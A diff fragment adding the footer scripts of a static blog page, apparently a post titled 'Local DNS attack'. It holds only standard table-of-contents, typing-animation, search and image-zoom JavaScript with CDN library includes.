+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Local DNS attack&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
